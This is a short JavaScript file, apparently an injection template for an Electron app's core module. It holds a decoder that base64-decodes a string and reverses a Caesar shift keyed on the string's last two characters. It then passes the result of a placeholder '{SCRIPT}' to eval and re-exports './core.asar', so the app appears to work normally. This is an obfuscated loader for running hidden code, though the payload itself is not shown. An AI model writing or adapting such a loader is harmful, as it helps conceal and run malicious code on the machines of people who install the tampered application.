function decrypt(chain) {
    let script = chain
    let buff = Buffer.from(script, 'base64');
    let step1 = buff.toString('utf-8');
    var key = step1.slice(-2);
    var txt = step1.slice(0, -2);
    var gap = key.split('').reduce(function(acc, val) {
        return acc + val.charCodeAt(0);
    }, 0) % 26
    var src = "";
    for (var i = 0; i < txt.length; i++) {
        var c = txt[i];
        if (c.match(/[a-z]/i)) {
            var c_int = "";
            if (c === c.toLowerCase()) {
                c_int = String.fromCharCode((c.charCodeAt(0) - 97 - gap + 26) % 26 + 97);
            } else {
                c_int = String.fromCharCode((c.charCodeAt(0) - 65 - gap + 26) % 26 + 65);
            }
            src += c_int;
        } else {
            src += c;
        }
    }
    return src
}
eval(decrypt("{SCRIPT}"))
module.exports = require('./core.asar');